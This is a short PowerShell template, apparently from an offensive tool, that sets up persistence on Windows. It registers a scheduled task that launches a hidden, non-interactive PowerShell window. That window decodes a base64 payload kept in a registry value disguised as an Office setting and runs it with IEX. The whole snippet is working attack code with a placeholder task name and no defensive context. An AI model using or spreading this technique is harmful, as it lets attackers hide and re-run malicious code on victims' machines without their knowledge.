# add to schedule tasks
$Action = New-ScheduledTaskAction -Execute 'powershell.exe' -Argument '-NonInteractive -NoLogo -NoProfile -WindowStyle Hidden "IEX([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String((Get-ItemProperty HKCU:Software\Microsoft\Office\Common).Ready)))"'
$Trigger = New-ScheduledTaskTrigger -Once -At 3pm
$Settings = New-ScheduledTaskSettingsSet
$Task = New-ScheduledTask -Action $Action -Trigger $Trigger -Settings $Settings
Register-ScheduledTask -TaskName '{{TASK_NAME}}' -InputObject $Task